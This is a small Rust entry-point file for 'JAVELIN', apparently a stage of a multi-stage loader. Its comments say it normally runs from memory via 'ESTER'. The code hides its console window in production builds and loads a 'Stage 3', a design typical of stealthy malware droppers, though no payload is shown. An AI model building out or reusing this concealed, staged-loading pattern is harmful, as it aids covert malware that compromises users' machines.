//! JAVELIN standalone binary (for testing purposes)
//!
//! In production, JAVELIN is executed from memory by ESTER
//! This binary is only used for development and testing

// Conditional windows subsystem: console for dev, windows (no console) for production
#![cfg_attr(feature = "production", windows_subsystem = "windows")]
#![cfg_attr(not(feature = "production"), windows_subsystem = "console")]

use javelin::{load_stage3};

fn main() {
    println!("[JAVELIN] Standalone execution mode");
    println!("[JAVELIN] Note: In production, JAVELIN runs from memory via ESTER");
    
    match load_stage3() {
        Ok(_) => {
            println!("[JAVELIN] Stage 3 loaded successfully");
        }
        Err(e) => {
            eprintln!("[JAVELIN] Failed to load Stage 3: {:?}", e);
            std::process::exit(1);
        }
    }
}
